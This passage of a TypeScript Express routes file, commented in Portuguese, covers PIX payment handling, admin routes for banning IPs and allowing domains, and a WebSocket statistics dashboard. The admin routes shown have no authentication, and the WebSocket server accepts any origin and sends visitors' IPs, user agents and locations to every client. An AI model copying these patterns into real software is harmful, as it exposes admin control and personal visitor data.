            console.log(`Email de confirmação enviado com sucesso para ${userEmail}`);
          } else {
            console.error(`Falha ao enviar email de confirmação para ${userEmail}`);
          }
        } catch (emailError) {
          console.error('Erro ao enviar email de confirmação:', emailError);
          paymentResult.emailSent = false;
          paymentResult.emailError = 'Falha ao enviar email de confirmação';
        }
      }
      
      // Retornar resultado para o frontend
      res.status(200).json(paymentResult);
    } catch (error: any) {
      console.error('Erro ao processar pagamento PIX:', error);
      res.status(500).json({ 
        error: error.message || 'Falha ao processar pagamento PIX.'
      });
    }
  });

  // ===== ROTAS DE ADMINISTRAÇÃO PARA BLOQUEIO DE IPS E DOMÍNIOS =====
  
  // Listar todos os IPs banidos
  app.get('/api/admin/ips', async (req, res) => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      res.json(bannedIps);
    } catch (error) {
      console.error('Erro ao listar IPs banidos:', error);
      res.status(500).json({ error: 'Falha ao listar IPs banidos' });
    }
  });
  
  // Obter detalhes de um IP específico
  app.get('/api/admin/ips/:ip', async (req, res) => {
    try {
      const ip = req.params.ip;
      const bannedIp = await storage.getBannedIp(ip);
      
      if (!bannedIp) {
        return res.status(404).json({ error: 'IP não encontrado' });
      }
      
      res.json(bannedIp);
    } catch (error) {
      console.error('Erro ao buscar detalhes do IP:', error);
      res.status(500).json({ error: 'Falha ao buscar detalhes do IP' });
    }
  });
  
  // Banir ou desbanir um IP
  app.patch('/api/admin/ips/:ip', async (req, res) => {
    try {
      const ip = req.params.ip;
      const { isBanned } = req.body;
      
      if (typeof isBanned !== 'boolean') {
        return res.status(400).json({ error: 'O campo isBanned deve ser um booleano' });
      }
      
      // Verificar se o IP existe
      const existingIp = await storage.getBannedIp(ip);
      
      if (!existingIp) {
        // IP não existe, criar novo registro
        const newBannedIp = await storage.createBannedIp({
          ip,
          isBanned,
          reason: `IP ${isBanned ? 'banido' : 'permitido'} manualmente por administrador`,
          userAgent: '',
          browserInfo: '',
          device: 'N/A',
          platform: 'N/A',
          location: await getIpLocation(ip)
        });
        
        return res.status(201).json(newBannedIp);
      }
      
      // IP existe, atualizar status
      const updatedIp = await storage.updateBannedIpStatus(ip, isBanned);
      
      if (!updatedIp) {
        return res.status(500).json({ error: 'Falha ao atualizar status do IP' });
      }
      
      res.json(updatedIp);
    } catch (error) {
      console.error('Erro ao atualizar status do IP:', error);
      res.status(500).json({ error: 'Falha ao atualizar status do IP' });
    }
  });
  
  // Listar todos os domínios permitidos
  app.get('/api/admin/domains', async (req, res) => {
    try {
      const domains = await storage.getAllAllowedDomains();
      res.json(domains);
    } catch (error) {
      console.error('Erro ao listar domínios permitidos:', error);
      res.status(500).json({ error: 'Falha ao listar domínios permitidos' });
    }
  });
  
  // Adicionar um novo domínio permitido
  app.post('/api/admin/domains', async (req, res) => {
    try {
      const { domain, isActive = true } = req.body;
      
      if (!domain) {
        return res.status(400).json({ error: 'O campo domain é obrigatório' });
      }
      
      // Verificar se o domínio já existe
      const existingDomain = await storage.getAllowedDomain(domain);
      
      if (existingDomain) {
        // Domínio já existe, atualizar status
        const updatedDomain = await storage.updateAllowedDomainStatus(domain, isActive);
        
        if (!updatedDomain) {
          return res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
        }
        
        return res.json(updatedDomain);
      }
      
      // Domínio não existe, criar novo
      const newDomain = await storage.createAllowedDomain({
        domain,
        isActive
      });
      
      res.status(201).json(newDomain);
    } catch (error) {
      console.error('Erro ao adicionar domínio permitido:', error);
      res.status(500).json({ error: 'Falha ao adicionar domínio permitido' });
    }
  });
  
  // Atualizar status de um domínio permitido
  app.patch('/api/admin/domains/:domain', async (req, res) => {
    try {
      const domain = req.params.domain;
      const { isActive } = req.body;
      
      if (typeof isActive !== 'boolean') {
        return res.status(400).json({ error: 'O campo isActive deve ser um booleano' });
      }
      
      // Verificar se o domínio existe
      const existingDomain = await storage.getAllowedDomain(domain);
      
      if (!existingDomain) {
        return res.status(404).json({ error: 'Domínio não encontrado' });
      }
      
      // Domínio existe, atualizar status
      const updatedDomain = await storage.updateAllowedDomainStatus(domain, isActive);
      
      if (!updatedDomain) {
        return res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
      }
      
      res.json(updatedDomain);
    } catch (error) {
      console.error('Erro ao atualizar status do domínio:', error);
      res.status(500).json({ error: 'Falha ao atualizar status do domínio' });
    }
  });
  
  // Página de estatísticas simples (rota pública, mas apenas dados anônimos)
  app.get('/ips/stats', async (req, res) => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      
      const totalBannedIps = bannedIps.filter(ip => ip.isBanned).length;
      const totalAllowedIps = bannedIps.filter(ip => !ip.isBanned).length;
      
      // Agrupar por dispositivo
      const deviceStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        const device = ip.device || 'Desconhecido';
        deviceStats[device] = (deviceStats[device] || 0) + 1;
      });
      
      // Agrupar por navegador
      const browserStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        const browser = ip.browserInfo?.split(' ')[0] || 'Desconhecido';
        browserStats[browser] = (browserStats[browser] || 0) + 1;
      });
      
      // Agrupar por plataforma
      const platformStats: Record<string, number> = {};
      bannedIps.forEach(ip => {
        let platform = ip.platform || 'Desconhecida';
        // Simplificar versões do Windows para apenas "Windows"
        if (platform.startsWith('Windows')) {
          platform = 'Windows';
        }
        // Simplificar versões do macOS para apenas "macOS"
        if (platform.startsWith('macOS')) {
          platform = 'macOS';
        }
        platformStats[platform] = (platformStats[platform] || 0) + 1;
      });
      
      res.json({
        totalIpsTracked: bannedIps.length,
        totalBannedIps,
        totalAllowedIps,
        deviceStats,
        browserStats,
        platformStats,
        lastUpdated: new Date().toISOString()
      });
    } catch (error) {
      console.error('Erro ao gerar estatísticas de IPs:', error);
      res.status(500).json({ error: 'Falha ao gerar estatísticas de IPs' });
    }
  });

  const httpServer = createServer(app);
  
  // Configurar o servidor WebSocket para a dashboard com verificação de origem
  const wss = new WebSocketServer({ 
    server: httpServer, 
    path: '/ws',
    // Permitir conexões de qualquer origem em produção
    verifyClient: (info, done) => {
      // Permitir todas as origens, já que o dashboard pode ser acessado pelo Netlify
      // em produção e também de hosts locais em desenvolvimento
      const origin = info.origin || '';
      console.log(`Conexão WebSocket tentada da origem: ${origin}`);
      
      // Sempre aceitar a conexão
      done(true);
    }
  });
  
  // Rastrear conexões ativas
  const connectedClients: WebSocket[] = [];
  
  // Variável para armazenar as estatísticas de acesso
  let accessSources: { source: string, count: number }[] = [
    { source: "WhatsApp", count: 0 },
    { source: "Facebook", count: 0 },
    { source: "Instagram", count: 0 },
    { source: "Google", count: 0 },
    { source: "Pesquisa Orgânica", count: 0 },
    { source: "Link Direto", count: 0 },
    { source: "Outros", count: 0 }
  ];
  
  // Variável para armazenar estatísticas de dispositivos
  let deviceStats: { type: string, count: number }[] = [
    { type: "Smartphone", count: 0 },
    { type: "Tablet", count: 0 },
    { type: "Desktop (Permitido)", count: 0 },
    { type: "Desktop (Bloqueado)", count: 0 },
    { type: "WhatsApp Web", count: 0 }
  ];
  
  // Simulação de usuários online para a dashboard
  let onlineUsers = 0;
  let totalVisits = 0;
  
  // Função para obter estatísticas do dashboard
  async function getDashboardStats() {
    try {
      // Obter dados do banco de dados
      const bannedIps = await storage.getAllBannedIps();
      const allowedDomains = await storage.getAllAllowedDomains();
      
      // Calcular estatísticas
      const stats = {
        onlineUsers,
        totalVisits,
        bannedIPs: bannedIps.filter(ip => ip.isBanned).length,
        allowedDomains: allowedDomains.filter(domain => domain.isActive).length
      };
      
      return {
        stats,
        bannedIPs: bannedIps
          .filter(ip => ip.isBanned)
          .sort((a, b) => (new Date(b.updatedAt || 0).getTime() - new Date(a.updatedAt || 0).getTime()))
          .slice(0, 50)
          .map(ip => ({
            ip: ip.ip,
            userAgent: ip.userAgent || 'Desconhecido',
            device: ip.device || 'Desconhecido',
            browserInfo: ip.browserInfo || 'Desconhecido',
            platform: ip.platform || 'Desconhecido',
            location: ip.location || 'Desconhecido',
            reason: ip.reason || 'Acesso bloqueado',
            timestamp: ip.updatedAt?.toISOString() || new Date().toISOString()
          })),
        accessSources,
        deviceStats
      };
    } catch (error) {
      console.error('Erro ao obter estatísticas do dashboard:', error);
      return {
        stats: { onlineUsers: 0, totalVisits: 0, bannedIPs: 0, allowedDomains: 0 },
        bannedIPs: [],
        accessSources,
        deviceStats
      };
    }
  }
  
  // Função para broadcast de mensagens para todos os clientes conectados
  function broadcastToAll(message: any) {
    const messageString = JSON.stringify(message);
    connectedClients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(messageString);
      }
    });
  }
  
  // Configuração de listener para conexões WebSocket
  wss.on('connection', async (ws) => {
    console.log('Nova conexão WebSocket estabelecida');
    
    // Adicionar à lista de clientes conectados
    connectedClients.push(ws);
    
    // Atualizar contador de usuários online
    onlineUsers += 1;
    totalVisits += 1;
    
    // Broadcast do número atualizado de usuários online
    broadcastToAll({
      type: 'user_connected',
      count: onlineUsers
    });
    
    // Enviar dados iniciais
    try {
      const data = await getDashboardStats();
      ws.send(JSON.stringify({
        type: 'initial_data',
        ...data
      }));
    } catch (error) {
      console.error('Erro ao enviar dados iniciais:', error);
    }
    
    // Lidar com mensagens do cliente
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        
        if (data.type === 'get_dashboard_data') {
          const dashboardData = await getDashboardStats();
          
          ws.send(JSON.stringify({
            type: 'dashboard_stats',
            stats: dashboardData.stats
          }));
          
          ws.send(JSON.stringify({
            type: 'banned_ips',
            ips: dashboardData.bannedIPs
          }));
          
          ws.send(JSON.stringify({
            type: 'access_sources',
            sources: dashboardData.accessSources
          }));
          
          ws.send(JSON.stringify({
            type: 'device_stats',
            devices: dashboardData.deviceStats
          }));
        }
      } catch (error) {
        console.error('Erro ao processar mensagem WebSocket:', error);
      }
    });
    
    // Lidar com fechamento de conexão
    ws.on('close', () => {
      // Remover da lista de clientes
      const index = connectedClients.indexOf(ws);
      if (index !== -1) {
        connectedClients.splice(index, 1);
      }
      
      // Atualizar contador de usuários online
      onlineUsers = Math.max(0, onlineUsers - 1);
      
      // Broadcast do número atualizado de usuários online
      broadcastToAll({
        type: 'user_connected',
        count: onlineUsers
      });
      
      console.log('Conexão WebSocket fechada');
    });
  });
  
  // Alimentar as estatísticas iniciais com dados do banco
  (async () => {
    try {
      const bannedIps = await storage.getAllBannedIps();
      
      // Atualizar estatísticas de dispositivos com base nos dados existentes
      const deviceCounts: Record<string, number> = {};
      
      bannedIps.forEach(ip => {
        const device = ip.device || 'Desconhecido';
        
        if (device.includes('WhatsApp Web')) {
          deviceCounts['WhatsApp Web'] = (deviceCounts['WhatsApp Web'] || 0) + 1;
        } else if (device.includes('Desktop')) {
          if (ip.isBanned) {
            deviceCounts['Desktop (Bloqueado)'] = (deviceCounts['Desktop (Bloqueado)'] || 0) + 1;
          } else {
            deviceCounts['Desktop (Permitido)'] = (deviceCounts['Desktop (Permitido)'] || 0) + 1;
          }
        } else if (device.includes('Tablet')) {
          deviceCounts['Tablet'] = (deviceCounts['Tablet'] || 0) + 1;
        } else {
          deviceCounts['Smartphone'] = (deviceCounts['Smartphone'] || 0) + 1;
        }
      });
      
      // Atualizar estatísticas de dispositivos
      deviceStats = deviceStats.map(stat => ({
        ...stat,
        count: deviceCounts[stat.type] || 0
      }));
      
      // Atualizar estatísticas de origens de acesso
      const sourceCounts: Record<string, number> = {};
      
      bannedIps.forEach(ip => {
        let source = "Outros";
        const referer = ip.referer || '';
        
        if (referer.includes('whatsapp')) {
          source = "WhatsApp";
        } else if (referer.includes('facebook') || referer.includes('fb.com')) {
          source = "Facebook";
        } else if (referer.includes('instagram')) {
          source = "Instagram";
        } else if (referer.includes('google')) {
          if (referer.includes('ads') || referer.includes('adwords')) {
            source = "Google";
          } else {
            source = "Pesquisa Orgânica";
          }
        } else if (!referer) {
          source = "Link Direto";
        }
        
        sourceCounts[source] = (sourceCounts[source] || 0) + 1;
      });
      
      // Atualizar estatísticas de origens de acesso
      accessSources = accessSources.map(source => ({
        ...source,
        count: sourceCounts[source.source] || 0
      }));
      
      console.log('Estatísticas iniciais carregadas para o dashboard');
    } catch (error) {
      console.error('Erro ao carregar estatísticas iniciais:', error);
    }
  })();

  return httpServer;
}
